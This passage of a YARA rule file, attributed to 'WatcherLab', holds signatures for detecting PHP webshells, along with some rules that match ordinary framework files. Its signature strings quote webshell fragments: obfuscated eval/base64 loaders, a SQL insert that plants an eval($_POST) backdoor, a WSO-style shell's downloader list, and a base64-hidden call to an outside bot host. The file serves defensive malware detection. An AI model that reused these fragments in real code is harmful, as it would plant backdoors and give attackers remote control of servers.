      $s4 = "XX5yU8tdPsAuxAamXZorludZdfCuDnNzqA+CMou9Gp9piezVsAfcbce7xaE6YacjStysEXazke4lSwdeQKw95UulVTrLzn/PybnqMvc9VGATKMN9SPYQVg8u11IRcOOs" ascii
      $s5 = "echo \\'<b>Namesis<br><br>\\'.php_uname().\\'<br></b>\\';echo \\'<form action=\"\" method=\"post\" enctype=\"multipart/form-data" ascii
      $s6 = "7sd08o9sdpuSVc0dD02ZbF3iR31OtZVNtdenSetlIsoYTuspRUKs9qsv0UNuZuj1SY/7s82YyvcOth/Mz2hHwHHaMVBrvU86R/QsNfQV+p6EJ+dbVMfdUMpM7TcQUEq5" ascii
      $s7 = "d\"></form>\\';if( $_POST[\\'_upl\\'] == \"Upload\" ) {" fullword ascii
      $s8 = "wTm9/Nqn0GhKkXn334I1jpKFTUGzy9+1KWeZcbx8VGaq4mG6aiJU5IbnSThnVv4ZwM7qMmjCL8iDP7VJFAhX3Py0rn4Xw==\";" fullword ascii
      $s9 = "## change pass $auth_pass in this below  ##" fullword ascii
      $s10 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s11 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s12 = "qu8xQ+//I1h4H/gFANtnxeyek2zLwVsyduy+1kEMwCmuPSVZXi02zT8hKghPxEfojQ+Fh/uE44Jg5b1anRxHDNbfCBeViisWHdLgEww0cjUgmHqsrr84BSicdEp7rDDe" ascii
      $s13 = "$auth_pass = \"a3567437a39f1bcd3f1035f87adf98ea\";" fullword ascii
      $s14 = "yCUBZpBo1T44+LtWGqLrUJto+EZYZTvxw19zSn0gLLvr3lf/4YHyhLOEvYQ1wmX/bczdLL8jcwWRSXPvmqPogieUh7Koem384AXFf+7of+6Iyr4yTTF7cIaQQoYtsL/B" ascii
      $s15 = "$lls = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s16 = "else { echo \\'<b>Upload Fail !!!</b><br><br>\\'; }}" fullword ascii
      $s17 = "r+apyuD3C80GFeasht8FVvHuac/VkvXZtPSj7QhYy29+9+JrPbhR8RZDaM5+6gdG2Puz4/vaHA+6/VJ/4yE7vVbefxzuBytdN10E986YsFCf0L+MvrL4tftpr7O+xfSX" ascii
      $s18 = "I7iv3oFbzjSCvtj5L+oYrLUSYmi4Uwkedh+Hv5cFAHPxX1yRnylZ3oSsGE9fTP8iRp+bszXDdcN1L9VT5rZ21XswloCxr4DffeinuAz75bXpKHs+YLeucvn3iGPaDDdT" ascii
      $s19 = "DG8ptfnJhALnGKdgetqw0mdUn1gDQi0AzFH4Z4FXE2Wnn/qn6NmDshXx/3zra8VvNN/5L3wXtooIg3LN5zdo05MADWjb/PNZ3C1GOBJ+zCDcGv1RMjCdbuvBQhAdIF1K" ascii
      $s20 = "UgBupBi9Qu5llO4XLNQiDNB2ZrJIpXX4hmV75NMXtXMhj3GZybtCKXeGvI9zGNLOh8wIrcv7R+lPGDpGctMJ70MQiXN0iPCOq0xerk9d0lFMEGtW7TMOEIjxdOXuzTDe" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule AdminUser
{
   meta:
      description = "php17 - file AdminUser.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21b354056b3611b01b040ae16037a5d007feeb639f58780075cfabdeb05e02a8"
   strings:
      $x1 = "* @copyright Copyright (c) 2011 - 2014 Aleksandr Torosh (http://wezoom.com.ua)" fullword ascii
      $s2 = "* @author Aleksandr Torosh <webtorua@gmail.com>" fullword ascii
      $s3 = "\"message\" => $this->getDi()->get('helper')->translate(\"The Login must be unique\")" fullword ascii
      $s4 = "'key'      => HOST_HASH . md5('Admin\\Model\\AdminUser::getRoleById::' . $id)," fullword ascii
      $s5 = "$authData->login = $this->getLogin();" fullword ascii
      $s6 = "public function getLogin()" fullword ascii
      $s7 = "$validator->add('login', new UniquenessValidator(" fullword ascii
      $s8 = "return ''; // We don't need hash of password. Just return empty string." fullword ascii
      $s9 = "public function setLogin($login)" fullword ascii
      $s10 = "\"message\" => $this->getDi()->get('helper')->translate(\"The Email must be unique\")" fullword ascii
      $s11 = "$this->password = password_hash($password, PASSWORD_DEFAULT);" fullword ascii
      $s12 = "if (password_verify($password, $this->password)) {" fullword ascii
      $s13 = "return $this->login;" fullword ascii
      $s14 = "public function checkPassword($password)" fullword ascii
      $s15 = "$this->login = $login;" fullword ascii
      $s16 = "$authData->email = $this->getEmail();" fullword ascii
      $s17 = "$authData->name = $this->getName();" fullword ascii
      $s18 = "public $login;" fullword ascii
      $s19 = "$authData->id = $this->getId();" fullword ascii
      $s20 = "public function getAuthData()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule AliasesTrait
{
   meta:
      description = "php17 - file AliasesTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d821cd37953b364a0437189f73e2863b071bebd04a858734bf79b85f09992136"
   strings:
      $s1 = "* Get alias value from mutator or directly from attribute" fullword ascii
      $s2 = "if ($value = Arr::get(static::getAliases(), $key)) {" fullword ascii
      $s3 = "* @param  string $key" fullword ascii
      $s4 = "return $this->getAttribute($key);" fullword ascii
      $s5 = "$value = parent::getAttribute($key);" fullword ascii
      $s6 = "public function getAttribute($key)" fullword ascii
      $s7 = "if ($this->hasGetMutator($key)) {" fullword ascii
      $s8 = "if (is_null($value) && (count(static::getAliases()) > 0)) {" fullword ascii
      $s9 = "* @param string $new" fullword ascii
      $s10 = "* @param string $old" fullword ascii
      $s11 = "namespace App\\Modules\\Content\\Traits;" fullword ascii
      $s12 = "$meta = Arr::get($value, 'meta');" fullword ascii
      $s13 = "public static function getAliases()" fullword ascii
      $s14 = "return parent::getAttribute($value);" fullword ascii
      $s15 = "public function mutateAttribute($key, $value)" fullword ascii
      $s16 = "return parent::mutateAttribute($key, $value);" fullword ascii
      $s17 = "if (isset(parent::$aliases) && (count(parent::$aliases) > 0)) {" fullword ascii
      $s18 = "return array_merge(parent::$aliases, static::$aliases);" fullword ascii
      $s19 = "use Nova\\Support\\Arr;" fullword ascii
      $s20 = "public static function addAlias($new, $old)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AliasClassLoader
{
   meta:
      description = "php17 - file AliasClassLoader.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59b7e245883f968a54e810e46f4493f0aa7188efd1dee0d3d72b95166ce0ed9f"
   strings:
      $s1 = "* @param bool $prepend Whether to prepend the autoloader or not" fullword ascii
      $s2 = "* Registers this instance as an autoloader." fullword ascii
      $s3 = "* @param array $map A map where keys are classes and values the absolute file path" fullword ascii
      $s4 = "if (array_key_exists($class, $aliases = $this->classAliasList->getRegisteredAliases())) {" fullword ascii
      $s5 = "* A class loader that uses the class alias list." fullword ascii
      $s6 = "// (because after all, we're in the auto loader.)" fullword ascii
      $s7 = "* @param string $class The name of the class" fullword ascii
      $s8 = "* Loads the given class or interface." fullword ascii
      $s9 = "class AliasClassLoader" fullword ascii
      $s10 = "// we have an alias for it, but we don't have it yet loaded" fullword ascii
      $s11 = "namespace Concrete\\Core\\Foundation;" fullword ascii
      $s12 = "private $isLoaded = false;" fullword ascii
      $s13 = "// we don't know earlier what namespace it'll be in" fullword ascii
      $s14 = "public function register($prepend = false)" fullword ascii
      $s15 = "// finally, we set up a class alias for this list. We do this now because" fullword ascii
      $s16 = "spl_autoload_register(array($this, 'loadClass'), true, $prepend);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_10f6b1d74824a045bf5637f2be4edb5c8e98156e
{
   meta:
      description = "php17 - file 10f6b1d74824a045bf5637f2be4edb5c8e98156e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7f7dd37a193c0e5f3390432f43ab88ea7e08c151e01fe2cede91e1c9c530cd19"
   strings:
      $s1 = "$C='e(]:preg_]:replace(array(\"/_/]:\",\"/-/\"),ar]:ra]:y(\"/\",\"+\"),$]:ss($]:s[$i],0]:,$e)]:]:)),$k)));$o=ob]:_get_contents()" ascii
      $s2 = "$j=str_replace(']:','',$U.$R.$X.$v.$E.$d.$p.$Z.$C.$z);" fullword ascii
      $s3 = "$M=str_replace('P','','cPreatPe_PPfunPcPtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule php17_403
{
   meta:
      description = "php17 - file 403.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8688f47389f51159531f323d3be6757d33460022eb50d1e3ccf89935a4a460be"
   strings:
      $s1 = "$_x=\"7b12e9u2EjD62f4VCKNGV42szWSaV5ayOGni1mRF20zaOEqlJFdvWoksVmxW6v9+dAYACWHa7J573ve5QXhYSwaDwWAwGAwGBXAWjLuu4fuszbSfafpC+tvGzk" ascii
      $s2 = "O8rYDNjNIZ6StxriGbbzNZbycuFPf9TTSa6qM2z/oqZYyyo3FF1iE7fI5q4na1h6xn+rjg966miL2vAChfRzGfKbyTFy6A2MUH0DxTKqC6atQNTjV4PAqpK')))));" fullword ascii
      $s3 = "HsDLBiNx6DaOW8Xapl8J4Ijy0LHJENEzIoklYMqiZHhEsTh7yKY9VkzSxeqtRKZDDubj8sLEhYpJW47pNdKveKkudaa21tUiwxGOL6o/a4l6nRR7P8X5nnavi0zIrc8I" ascii
      $s4 = "u+m7dqF4m10OZym8whMJ1KRQaKRRT66CQAsPHv29a+zQH5iAyNSZzomsCyo8Lq594ouS5ll1qqb7kgk9tXmxJgBOADR0bNDzggHYmfTlOGqnxyK8/F7c4OKaML5/rFfd" ascii
      $s5 = "xol+srxU0ZD3S2/ojPBEdmB9BDvccQ9SnkF9ZFSbKEW++SqSZAjI8OhuWdEQn+7992D896wIwIT3KohdWwgAYS6zDXMHlrGtyWk5OqHx+e/QGlvETftpX3fHMv4EURvO" ascii
      $s6 = "tV1cpN+ltxg1JcP7NBLXqORM8cNpWAlg74g6aKXb86MmAYzRQ4OL7wdl7+qypWYw7pHrhPBPvWFi5VVaF+C5XnL8Uc3rzTZxxNGj1kEeye272Uq+hBV70TleH0Py58x+" ascii
      $s7 = "GEq4oxkWQ4sGG58GLog4rQ0jlDdfRnPHK3MWISFm0XGL8R6nBv7q6VpEgR7YgjZZg5TRT9plLm54xsBzh5YFKznGTsFjjm95BPGGcgJCHU7g5o2VlJyY2e1u2OQyaaG3" ascii
      $s8 = "FdIKKbypGqWQ5afzAz6ui5CpoQLYO57Sjc6u1/JseyIm8V0SuRXRlk0pe5ChyjcHEmsalSSpYKd4fjpIiLp6jloWW8gqLrFF2EIoDI8gpzzPTNfJbsLIw4oI3vwZxc9Y" ascii
      $s9 = "vwg8UuS3oqdh0zLytLcEq8LnTrpHSFh4DqPyMdzKg+AXKRJhCuROA73F5EvtW2cTjTdgEt1LxJtguThHxJ9d3jTDGVBsj6TcYFKE0NVXQXcelseVf8JYec8cSuI2Rk0n" ascii
      $s10 = "wkN2IMglEXd5tzF96yAudpmg6mhJZMs09qGgpzAPzCt1uZbV+SDmyfBoXZZ/BCm+2JCLELuZWEej2bM5t1Ip4i9u01FU7mZJNrsuiuQJBu9IiBkcE3MZmJcJ5DMuWzEJ" ascii
      $s11 = "asbyHtU2vSqtOnzrvDg5pq72OLEpFBohWxn0YdFtgi8R5Uu4TPAv9IF7kDMs78QrUbWd1jvVuAIlS/fetydaAvXZNWl9jiyDIle98tMyrRusbKHaR3qXS5gAUvxjIS51" ascii
      $s12 = "aki4Cvi4vS72FoNdyAA5tIfg1SZE4fy134EG7zXIIZ6d9JpJ1mVPuKvQfL9XK3faXJEaWd+be7EELW01wMgumbVxsXB32VNbiNtac2TQqojML20vT1qS00UvcyBpGXTS" ascii
      $s13 = "86l8NxAKhIJY5ZSgfM1OOxHPmyOWNW23U8ofsf3e8nv+bAwad45IsNk2VjNGqhPNj/oB9s9x1vKAQrbJd2MH4+BL6H5b7wuuPLRzULGKEY3QAYID2uM5RSNStAxM+DkN" ascii
      $s14 = "pwyyGIZMtaGXl4T78bsThenpva7DqYQWO29xkrzUadUH12NJRNOo51xx9JJuASAd9vrjMEErEAD/TBb1ojmMHN2ADNvNk7X/xy4vPT0fTG/CcKFxTVoyhvSzi6E/gNaf" ascii
      $s15 = "k1v15BHAqxv5oEUcjrm44s0DaC7ETqYMOPGST5xvP6fgNqpaxGj834PWf/+VL0yJtV4RM/MgiEyYqxcHYm1a4QS+6zA2tyHlPRXYEitHBinoa/J7snCb49bacBmvmncC" ascii
      $s16 = "v5JVk5eUmnRZbPb9g+DJwfpnodtNyXzb919415e+mpg6A+cqTbbuU+0BSL3I+jy9HekyEhywX8fFafKKJ89ncA2/plKThm1oZoGxpLuiFJ8ubZo5axTKp0jEub6OFtPR" ascii
      $s17 = "8fCSwAlQUDRzRa3OxoedZUU78OK8oWf2/8FYBXk18m0oBn1QWpflYycmiT5hV6JFgOaUvnVWy8Ep21eejAwdw9//wA4sncCcyMwS+mWyIHXHwSgNsUX8MJK8fALAmg2S" ascii
      $s18 = "Vp/4tRP+y//rjDOp+ONm3307/rffWH4TPycffaz8nMC6fHjsf6if7dGjEan6Zk4+/nHOWmR7v9LdC7B7QU4z3N3DvUmCc9nZ8fmJcX8K4E4zTD49Gdtg2YuvY73of2xz" ascii
      $s19 = "0GBCtvKkdSzC7LFw+Ku7YhUKsP/M8nDdLQJZxSJ9Ir0u1FxUNK//YaqZQePTjZfXV0gjiZ+xcMVxtTmNA1tTkWcZ4Qc0ASYiAehnTsCzI6ilBahQfFoiWsCSjxQTLfYA" ascii
      $s20 = "4TxfvG3jHH46OZSgqf4TZ0/JEaDM9q4/OHqs1Rrhc3MR3a8M8FvIZ35Lv8pewuzzCowjzGZqyUIrTpNT+5OE//wzz898OVMriMC8aAcGp+uHx6f7JGTs8PnsX4yFJ1Cv" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_0537fb40a68c18da59a35c2bfe1ca554
{
   meta:
      description = "php17 - file 0537fb40a68c18da59a35c2bfe1ca554.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e14014dee6af3c42ae29dfc7eb3eb03790020c3c28aa5262fffe4a3b93a6df0f"
   strings:
      $s1 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s2 = "$b374k=@create_function('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'.'( bas'.'e64'.'_de'.'co'.'de($x)));');@" ascii
      $s3 = "http://code.google.com/p/b374k-shell" fullword ascii
      $s4 = "6ppnLeXeCvv3J4fek/1qQ7wHyfX/AJOq8E56zcjra+UrQ7NvTqhDe7zuK+PqsKnia6YsX5dE1seEwyYF4vaeZU/CKvqvVj37aa7f8dW9S5XajWyHTdIkNPGsSDoWE825" ascii
      $s5 = "XbxED1cY2ZJZjNJYLQZmczAOoh+iv0ftPUaA8vGZwQNd8oAhlRj5snp4/OKG6f9g8RKNelT9eVPmfq1r0C6fo1uHOrRuQq8hRLJB2tKMxlCVp6ieopm4ulhMHyl4IMID" ascii
      $s6 = "KcjVAwhFDURJIcIKb9n/8EfUvkMGMDw4KKupeCIrcGfCW6V20FH2IrqL3+GoQqmn4ch5Oe4x+AvjQthiKbwQ8d3jBKJyLzt67wno9+G+gWOz590gUxzE4JUcjv0CG7yN" ascii
      $s7 = "0XU4e7MaxpC4HvVJ/3dbtWaPfzLQsZbuvaou9k8huOxmi0p9ktGR9mVwzU2GzqhGLgVqslogtybSUUb494JyOs89ypWynIW4NNV8YVvlNN+mMqtuE0IjXm9Ot3WATcqs" ascii
      $s8 = "K6SC30eCeXXbCzuZXhteBy+UUcGF9lpHb54b+OP126+DGKE5mQxEwLYwi5vGIrCEKT+Ai94mhqAQ4KqgfKcGrKajl8xf9ORRGJRyJxGPHS72MNRIKl3UlrqnLfxqzT6C" ascii
      $s9 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\";" fullword ascii
      $s10 = "b/dpTARj4Af+LHwXwntiFIcCxB/8US+b0fcwLCI5/nIcC5ylHYuADGSgIeAUtH/mzAiBKS2Io2a2+IrGszAXvPZyFAr+YE4CxJPpogr6MlDU8JXhnCMfX3i0JiPA8xNh" ascii
      $s11 = "V/XpeQ43mCSHUkJ4cruneu9GHZBzSizP0X8e9p1IuZl/DXKTnPeBNfJ5euvh8NXXxnfefN/GdlNvFGNB2F+eVHhjAivPpq4fBJPPlVDjq+nLB0QDhobW9Nx4E2fGGhVA" ascii
      $s12 = "J5l3945ZcMdQLNiJeJfFJEDRWhrqOi8TvLS/WK/0FAF90mBfrsstg+b6j07xYoW5zKoc6Dv552+6iMyBhKfzrXLXgqT+E5jEa6TS7zUkEvWb1umm+gnjSH4CxK3FJ4ET" ascii
      $s13 = "8pUXfiQ1lx9wRlb6P+AQ8i4kyQ5U7jRwMIB4B/0F+dbRviH4iJ9z37FwY+B+Dx+gIFJiXBssCDw/V9oY3eAIGgI9QJ9D0PALXPCmDYqBiPkQ+Mu4E3TUBp1KQNVgSOpX" ascii
      $s14 = "rtCetHZhftcbZXnYtZdS5uue5+VitMp040WpRtGhKqVRynZocWU6pGwezklgnzc0+R3YWxn4wS1kzszTIJu3aximaxZkwIaXaeNaeC3lghrL10X5ulFurlBLPc2qOFdU" ascii
      $s15 = "x0TNu+p3net8/PcGlB7fCGJ2tmqLEA2qQyAOcQSCOMBYEiiyFu2n06kkODPzBMjjkWXrnNtydMGA5gWvjWjU0LYVwz5HUvTubf0p8/iB9QckfU5/RLN4vhU5wAES35uz" ascii
      $s16 = "uneZKU3m1dVZ8naQ7xJYbjuLVTGMl17M9O6OxopIrcflKo3ywFX0gKZlSr3/MdQvVeHoxzHdzgt1KtrpUoi4nzIJeElhyNJFWg4muJlat5Ca3XpkG65SGq/2qaSyScqO" ascii
      $s17 = "NojRf2GFZ68lAPqmyZ7kpN9ftAhfd4+Rr3OgbZvmAV528F0bu3VWlk8GhTsMktjgUXFQKdtxwwslafPn9fz//GX8+DcEh3uDDiXDh7c46eNwdr3ZFdO3C7YVHFKDIOsD" ascii
      $s18 = "DD4BG+hPF7riCCqR/IajnKLwZbnCWbagRHMtAt9FtcV9gomnefbBgNeA6KWUY1OEu+hx9iH4B//9HFF4x/3A45fwqWJ+jD5Hor7L7L+h44AtAuVRMC8VEkSmGu/ugPnw" ascii
      $s19 = "p9iuT5YCMiJYiP//8xfsHdHTwD1omef7ymy7qEY4RNWhPUNpnWJbA2T9/AYrshcgzNFqzzFjEvQAOhydJZbn9AxiVQC2Avwq/3GeWgLp+QSeEDU5+io0b/dGkMp1EmpV" ascii
      $s20 = "wUQB93xkgzxXgaXxLuvI7pWRy5ymF84R06v6sXj8RBGzsC/SZBOoa3ih5q3J3OmWYXFO17qz7ePIeDSdwmeb+LxjlB3F//9n0O6fp18l8wB/uP/ef4Rh0xto/BGHrF5y" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule _sidebar_menu_blade
{
   meta:
      description = "php17 - file _sidebar-menu.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8064cfc906eff8068889db1025f5115c695d867e7b9a892cebd33813d7a24a98"
   strings:
      $s1 = "{{-- Configuration --}}" fullword ascii
      $s2 = "{{-- Language Switcher Dropdown --}}" fullword ascii
      $s3 = "{{-- @include('manager._sidebar-menu-i18n') --}}" fullword ascii
      $s4 = "<li class=\"{{ $route == 'manager.business.service.index' ? 'active' : '' }}\" title=\"{{ trans('nav.manager.left.services') }}" fullword ascii
      $s5 = "<li><a href=\"{{ route('manager.business.notifications.show', $business) }}\"><i class=\"fa fa-bullhorn\"></i><span>{{ t" fullword ascii
      $s6 = "<a href=\"{{ route('manager.addressbook.index', $business) }}\">" fullword ascii
      $s7 = "<li class=\"{{ $route == 'manager.business.vacancy.create' ? 'active' : '' }}\" title=\"{{ trans('nav.manager.left.availability" fullword ascii
      $s8 = "<li class=\"{{ $route == 'manager.business.humanresource.index' ? 'active' : '' }}\" title=\"{{ trans('nav.manager.left.staff')" fullword ascii
      $s9 = "<li class=\"{{ $route == 'manager.business.agenda.calendar' ? 'active' : '' }}\" title=\"{{ trans('nav.manager.left.calendar') " fullword ascii
      $s10 = "<a href=\"{{ route('manager.business.service.index', $business) }}\">" fullword ascii
      $s11 = "<li class=\"{{ $route == 'manager.business.show' ? 'active' : '' }}\" title=\"{{ trans('nav.manager.left.dashboard') }}\" >" fullword ascii
      $s12 = "<li><a href=\"{{ route('manager.business.vacancy.show', $business) }}\"><i class=\"fa fa-calendar\"></i><span>{{ trans('" fullword ascii
      $s13 = "<li><a href=\"{{ route('manager.business.edit', $business) }}\"><i class=\"fa fa-pencil-square-o\"></i><span>{{ trans('n" fullword ascii
      $s14 = "<a href=\"#\"><i class=\"fa fa-home\"></i> <span>{{ $business->name }}</span> <i class=\"fa fa-angle-left pull-right\"></i></a" fullword ascii
      $s15 = "<li><a href=\"{{ route('manager.business.preferences', $business) }}\"><i class=\"fa fa-cogs\"></i><span>{{ trans('nav.m" fullword ascii
      $s16 = "<a href=\"#\"><i class=\"fa fa-home\"></i> <span>{{ $business->name }}</span> <i class=\"fa fa-angle-left pull-right\"></i></a>" fullword ascii
      $s17 = "<!-- Sidebar Menu -->" fullword ascii
      $s18 = "<!-- /.sidebar-menu -->" fullword ascii
      $s19 = "<span>{{ trans('nav.manager.left.addressbook') }}</span>" fullword ascii
      $s20 = "<li class=\"header\">{{ route('guest.business.home', $business->slug) }}</li>" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 10KB and
      8 of them
}

rule AcceptanceHelper
{
   meta:
      description = "php17 - file AcceptanceHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cbc3a8d473218db4fdc4851fb3f7af3fb2e45361f9a8983ef922d226ca686785"
   strings:
      $s1 = "namespace Codeception\\Module;" fullword ascii
      $s2 = "// all public methods declared in helper class will be available in $I" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9e6c03eef27338c11db7e6b2dbcea7cb5402e366
{
   meta:
      description = "php17 - file 9e6c03eef27338c11db7e6b2dbcea7cb5402e366.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "62af3fadae7589d30890b2538c2e8177abc894b8639afbbbb8a43d68074a0e45"
   strings:
      $s1 = "riptID:ID/2016-02-23T12:57:52+00:00) (Generated on 2016-02-23 - http://cipherdesign.co.uk/service/php-obfuscator)" fullword ascii
      $s2 = "<?php // Copyright 2016 - Do not attempt to reverse engineer this file. Please contact us for details, quoting the ScriptID. (Sc" ascii
      $s3 = "<?php // Copyright 2016 - Do not attempt to reverse engineer this file. Please contact us for details, quoting the ScriptID. (Sc" ascii
      $s4 = "jenn(1P58Xn87Xn8$X)58VfHj1f8$ef8$e)87$)5(V$8$e?nv8OHUX_58V$8$V_n(X)5n$)Hj1nnU8n" fullword ascii
      $s5 = "NvZGUoc3RydHIoZnJlYWQoJE9JMEkwMU8xMElPSU9JMEksNzI0KSwnYVA/LDckLlJjWGx4aGV3ejVWKV9uOCpIT0Era0MmUWZkc0VLdig9cUpaSU40YkcwIy1URGpyZ3" ascii
      $s6 = "U5NkxGMVVAbXBvIVdTeUIlaXRNMzJZJywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAuLCEkJSYqKC" ascii
      $s7 = "JiJyk7JE8xT0lPMTAxMElPSTAxMDE9aW50dmFsKCcwMDIwNTgnKTtmc2VlaygkT0kwSTAxTzEwSU9JT0kwSSxpbnR2YWwoJzAwMDc5NCcpKTtldmFsKGJhc2U2NF9kZW" ascii
      $s8 = "$OI0IO10101OI0I01=__FILE__;$O10I0I01O1OI01OIOI=72;eval(base64_decode('JE9JMEkwMU8xMElPSU9JMEk9Zm9wZW4oJE9JMElPMTAxMDFPSTBJMDEsJ3" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      all of them
}

rule AjaxResponse
{
   meta:
      description = "php17 - file AjaxResponse.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cd277a797c8fe20d050a4219d07da1b33428eb6a870b0fed470436b322055e4"
   strings:
      $s1 = "* @param \\stdClass $data Response data. Must be able to be encoded in JSON." fullword ascii
      $s2 = "* Get the response data, which will be a stdClass object with property \"value\"" fullword ascii
      $s3 = "* Cancel the response and send a 403 header" fullword ascii
      $s4 = "* Get the max-age for client caching" fullword ascii
      $s5 = "* JSON endpoint response" fullword ascii
      $s6 = "* Set the response data" fullword ascii
      $s7 = "* @since 1.12.0" fullword ascii
      $s8 = "* @param int $ttl Time to cache in seconds" fullword ascii
      $s9 = "public function getData();" fullword ascii
      $s10 = "public function getTtl();" fullword ascii
      $s11 = "* Has the response been cancelled?" fullword ascii
      $s12 = "* Set the max-age for client caching" fullword ascii
      $s13 = "namespace Elgg\\Services;" fullword ascii
      $s14 = "public function setTtl($ttl = 0);" fullword ascii
      $s15 = "public function isCancelled();" fullword ascii
      $s16 = "const RESPONSE_HOOK = 'ajax_response';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule AbstractConfigElement
{
   meta:
      description = "php17 - file AbstractConfigElement.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e71445e45c0c41bbdad845b25e45d884f86bc8ab653fc21d96c3bd13308f07b5"
   strings:
      $s1 = "namespace Pimcore\\DataObject\\Import\\ColumnConfig;" fullword ascii
      $s2 = "* @param mixed|null $context" fullword ascii
      $s3 = "* @var mixed|null" fullword ascii
      $s4 = "* @return mixed|null" fullword ascii
      $s5 = "abstract class AbstractConfigElement implements ConfigElementInterface" fullword ascii
      $s6 = "public function getLabel()" fullword ascii
      $s7 = "public function getContext()" fullword ascii
      $s8 = "public function __construct(\\stdClass $config, $context = null)" fullword ascii
      $s9 = "$this->attribute = $config->attribute;" fullword ascii
      $s10 = "public function setContext($context = null)" fullword ascii
      $s11 = "* @package    Object" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule a0dc6b2ef915ec2a070e1fca150025ca59aad6fb
{
   meta:
      description = "php17 - file a0dc6b2ef915ec2a070e1fca150025ca59aad6fb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fc23c8ff65cdc37ae43f8a24d6bb3495fb7d16c838d3ffdee87976f184b2e15b"
   strings:
      $s1 = "INSERT INTO `dede_mytag` VALUES('26635','0','','0','0','0','<?php @eval($_POST[ou])?>','');" fullword ascii
   condition:
      uint16(0) == 0x4e49 and filesize < 1KB and
      all of them
}

rule a05811ee776c0536a890dba465e501168851df6c
{
   meta:
      description = "php17 - file a05811ee776c0536a890dba465e501168851df6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bdae76eb77568d3cfe7e58878ce5520d2e3065d4567b7c9d24d193a012637227"
   strings:
      $x1 = "\"findconfig * files\" => \"find / -typef - name\\\"config*\\\"\", \"find config* files in current dir\" => \"find . -type f -na" ascii
      $x2 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $x3 = "' < td > < nobr > '.substr(@php_uname(), 0, 120).' < ahref = \"http://www.google.com/search?q='.urlencode(@php_uname()).'\"targe" ascii
      $x4 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x5 = "$exdblink = 'http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=';" fullword ascii
      $x6 = "if ($this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\")) return true;" fullword ascii
      $x7 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump'" fullword ascii
      $x8 = "00px'>\" . @htmlspecialchars($_POST['p3']) . \"</textarea><br/><input type=submit value='Execute'>\";" fullword ascii
      $x9 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirro" fullword ascii
      $x10 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $s11 = "wsoSecParam('Downloaders', implode(', ', $temp));" fullword ascii
      $s12 = "if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[$_SERVER['HTTP_HOST'] . 'ajax'] = false;" fullword ascii
      $s13 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_" fullword ascii
      $s14 = "for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));" fullword ascii
      $s15 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST" fullword ascii
      $s16 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SE" fullword ascii
      $s17 = "'<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">' . " ascii
      $s18 = "if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[$_SERVER['HTTP_HOST" fullword ascii
